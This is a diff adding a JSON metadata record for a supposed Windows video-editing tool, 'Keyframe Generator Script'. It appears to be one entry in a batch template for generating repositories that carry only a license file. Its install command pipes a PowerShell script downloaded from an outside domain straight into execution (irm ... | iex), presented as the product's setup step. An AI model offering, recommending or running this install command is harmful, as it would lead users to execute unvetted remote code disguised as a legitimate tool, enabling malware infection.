@@ -1,0 +1,21 @@
+{
+  "repo": "Keyframe-Generator-Script",
+  "product": "Keyframe Generator Script",
+  "kind": "dev-tool",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30",
+  "format": "license-md-only",
+  "category": "video",
+  "topics": [
+    "keyframe-generator-script",
+    "keyframe",
+    "generator",
+    "script",
+    "video-editing",
+    "subtitles",
+    "content-creator",
+    "windows"
+  ]
+}
